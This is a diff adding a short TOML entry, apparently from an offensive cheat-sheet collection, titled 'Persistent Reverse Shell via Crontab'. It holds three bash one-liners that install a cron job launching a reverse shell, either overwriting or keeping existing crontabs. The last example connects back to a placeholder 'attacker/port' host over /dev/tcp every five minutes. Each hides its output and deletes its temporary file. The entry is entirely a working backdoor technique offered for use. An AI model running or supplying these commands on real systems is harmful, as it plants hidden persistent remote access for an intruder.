@@ -1,0 +1,19 @@
+title = "Persistent Reverse Shell via Crontab"
+description = ""
+tags = ["linux", "bash", "backdoor"]
+source = ["https://gist.github.com/hoefler02/2ca8166c167f147c8fb076b48eb7cb47"]
+
+[[data]]
+description = "Overwrites existing crontabs:"
+language = "bash"
+command = """(touch .tab ; echo "* * * * * <reverse-shell-of-choice>" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"""
+
+[[data]]
+description = "Keeps existing crontabs:"
+language = "bash"
+command = """(crontab -l > .tab ; echo "* * * * * <reverse-shell-of-choice>" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"""
+
+[[data]]
+description = "Example sending bash reverse shell every 5 min:"
+language = "bash"
+command = """(touch .tab ; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker/port 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"""
